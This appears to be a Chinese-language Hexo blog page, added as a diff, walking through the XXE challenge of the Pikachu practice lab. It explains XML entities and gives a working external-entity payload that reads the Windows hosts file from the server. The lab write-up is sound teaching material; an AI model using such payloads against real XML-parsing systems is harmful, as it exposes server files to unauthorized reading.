@@ -1,0 +1,214 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>pikachu解题漏洞报告-XXE漏洞 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="pikachu解题漏洞报告-XXE漏洞概念解释1.XXE -“xml external entity injection”既”xml外部实体注入漏洞”。
+概括一下就是”攻击者通过向服务器注入指定的x,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="pikachu解题漏洞报告-XXE漏洞 - Hexo"/>
+    <meta name="twitter:description" content="pikachu解题漏洞报告-XXE漏洞概念解释1.XXE -“xml external entity injection”既”xml外部实体注入漏洞”。
+概括一下就是”攻击者通过向服务器注入指定的x,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Hexo"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="pikachu解题漏洞报告-XXE漏洞 - Hexo"/>
+    <meta property="og:description" content="pikachu解题漏洞报告-XXE漏洞概念解释1.XXE -“xml external entity injection”既”xml外部实体注入漏洞”。
+概括一下就是”攻击者通过向服务器注入指定的x,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">pikachu解题漏洞报告-XXE漏洞</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">pikachu解题漏洞报告-XXE漏洞</h1>
+        <div class="stuff">
+            <span>四月 07, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="pikachu解题漏洞报告-XXE漏洞"><a href="#pikachu解题漏洞报告-XXE漏洞" class="headerlink" title="pikachu解题漏洞报告-XXE漏洞"></a>pikachu解题漏洞报告-XXE漏洞</h1><h2 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h2><p>1.XXE -“xml external entity injection”既”xml外部实体注入漏洞”。</p>
+<p>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>
+<p>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p>
+<p>2.xml：</p>
+<p>XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储， 结构是树形结构，有标签构成，这点很像HTML语言。但是XML和HTML有明显区别如下：</p>
+<p>XML 被设计用来传输和存储数据。</p>
+<p>HTML 被设计用来显示数据。</p>
+<p>xml纯文本格式存储的数据，如果需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑HTML。通过 XML，数据能够存储在独立的 XML 文件中。这样就可以专注于使用 HTML 进行布局和显示，并确保修改底层数据不再需要对 HTML 进行任何的改变。通过使用几行 JavaScript，你就可以读取一个外部 XML 文件，然后更新 HTML 中的数据内容。</p>
+<p>3.xml实体：</p>
+<p>在 XML 中，一些字符拥有特殊的意义。如果你把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生 XML 错误,为了避免这个错误，用实体引用来代替 这种特殊 字符</p>
+<p>实体就是来代替字符数据的，它可以减少大量工作  ，一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;). </p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220408112808.png" alt="20220408112808"></p>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
+<p>实体引用是对实体的引用。</p>
+<p>实体可在内部或外部进行声明。</p>
+<p>普通实体在dtd中定义，在XML文档中使用，分为内部与外部实体，外部实体就是引用其他的XML文件的内容来作为一个实体（要是直接插入的话，写死你….）来定义实体，内部实体直接用<!ELEMENT 实体名 "文本内容">来声明，外部实体则通过使用“SYSTEM”来声明：<!ENTITY "外部文件URI地址">，它们都通过  &amp;实体名;   (别忘了后面的逗号)来使用（也就是引用）。</p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><p>1.提交一个正确的xml，看返回情况</p>
+<?xml version="1.0" encoding="UTF-8" ?><pre><code>&lt;!-- 第一行是 XML 声明。它定义 XML 的版本 (1.0) 和所使用的编码UTF-8 --&gt;
+</code></pre>
+<!DOCTYPE note [
+    <!ENTITY hack "hello world">
+<p>]&gt;</p>
+<p><name>&amp;hack;</name></p>
+<p>2.可以看到被成功解析了</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220407114554.png" alt="20220407114554"></p>
+<p>3.外部实体引用 Payload，访问服务器上的hosts文件</p>
+<?xml version="1.0"?>
+<!DOCTYPE ANY[ 
+<!ENTITY f SYSTEM "file:///C://Windows/System32/drivers/etc/hosts">
+<p>]&gt;<br><x>&amp;f;</x></p>
+<p>4.查看到内容</p>
+<p><img src="https://raw.githubusercontent.com/virbellez/pigo/master/images/20220407114742.png" alt="20220407114742"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHNkazB1a3lqNl9kMl82P2U9aDgxYUZQ.wav"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.jscdn.cn/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBb05yS01seWpjbkZnMHhtbVE0d01TYUZqQ2w4P2U9MGpOaFVZ.wav"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pikachu%E8%A7%A3%E9%A2%98%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A-XXE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">pikachu解题漏洞报告-XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E8%A7%A3%E9%87%8A"><span class="toc-number">1.1.</span> <span class="toc-text">概念解释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">解题流程</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
